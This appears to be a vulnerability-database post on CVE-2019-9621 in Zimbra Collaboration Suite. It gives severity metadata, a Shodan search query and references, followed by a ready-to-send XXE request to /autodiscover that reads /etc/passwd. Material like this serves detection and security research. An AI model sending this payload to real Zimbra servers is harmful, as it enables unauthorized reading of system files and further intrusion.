---
layout: "post"
cve_id: "CVE-2019-9621"
title: "Zimbra Collaboration Suite - SSRF"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-9621.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-9621.yaml"
author: "riteshs4hu"
severity: "high"
reference:
  - "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb"
  - "https://nvd.nist.gov/vuln/detail/cve-2019-9621"
  - "http://packetstormsecurity.com/files/153190/Zimbra-XML-Injection-Server-Side-Request-Forgery.html"
  - "https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html"
  - "https://bugzilla.zimbra.com/show_bug.cgi?id=109127"
classification:
  cvss-metrics: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
  cvss-score: 7.5
  cve-id: "CVE-2019-9621"
  cwe-id: "CWE-918"
  epss-score: 0.94119
  epss-percentile: 0.99904
  cpe: "cpe:2.3:a:zimbra:collaboration_server:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 1
  vendor: "zimbra"
  product: "collaboration_server"
  shodan-query: "html:\"Zimbra Collaboration Suite Web Client\""
tags:
  - "cve"
  - "cve2019"
  - "zimbra"
  - "collaboration-server"
  - "oast"
  - "oob"
  - "xxe"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
Zimbra Collaboration Suite before 8.6 patch 13, 8.7.x before 8.7.11 patch 10, and 8.8.x before 8.8.10 patch 7 or 8.8.x before 8.8.11 patch 3 allows SSRF via the ProxyServlet component.


## üåê HTTP Request
```nohighlight
POST /autodiscover HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 282
Content-Type: application/xml
Accept-Encoding: gzip

<?xml version="1.0"?>
<!DOCTYPE soap [
<!ELEMENT soap ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<Autodiscover>
  <Request>
    <EMailAddress>test@example.com</EMailAddress>
    <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
  </Request>
</Autodiscover>
```


